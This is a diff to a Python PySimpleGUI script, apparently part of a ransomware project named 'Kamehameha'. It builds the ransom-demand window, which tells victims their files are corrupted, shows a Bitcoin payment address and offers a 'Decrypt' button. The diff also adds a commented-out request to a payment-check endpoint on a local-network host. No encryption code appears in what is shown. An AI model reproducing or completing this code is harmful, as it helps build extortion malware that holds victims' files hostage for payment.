@@ -1,4 +1,5 @@
 import PySimpleGUI as sg
+import requests
 
 sg.theme('Black')   # Add a touch of color
 # All the stuff inside your window.
@@ -9,15 +10,14 @@ layout = [  [sg.Text('Oops, looks like your files have been corrupted \nWhat hap
             [sg.Text('How do i Pay?', font='16', text_color='white', background_color='maroon')],
             [sg.Text('Below is the address where you can pay with bitcoins')],
             [sg.Text('Bitcoin Address: 151amaAjamfafa2665aaJoafaFjpajfnaifaJFNajf ', font='14', text_color='white', background_color='maroon')],
-            [sg.Button('Check Payment'), sg.Button('Decrypt')] ]
+            [sg.Button('Decrypt')] ]
 
 # Create the Window
 window = sg.Window('Kamehameha', layout)
 # Event Loop to process "events" and get the "values" of the inputs
 while True:
-    event, values = window.read()
-    if event == sg.WIN_CLOSED or event == 'Cancel': # if user closes window or clicks cancel
+    event, values = window.read(timeout=100)
+    if event == sg.WINDOW_CLOSED:
         break
-    print('You entered ', values[0])
-
+    #requests.get("http://172.16.0.6:5000/payransome/")
 window.close()
